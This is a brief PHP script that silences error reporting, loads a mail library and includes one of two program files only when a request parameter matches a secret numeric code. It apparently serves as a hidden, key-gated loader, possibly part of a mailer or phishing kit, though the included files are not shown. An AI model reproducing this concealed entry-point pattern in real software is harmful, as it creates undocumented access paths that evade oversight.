<?php 
error_reporting(0);
require ('lib/omail.php');
$ormit = ''; if(!empty($_REQUEST['ormit'])){$ormit = strtolower($_REQUEST['ormit']);}

if($ormit == '07072017'){include ('program/07072017.php');}
if($ormit == '84551241'){include ('program/84551241.php');}
?>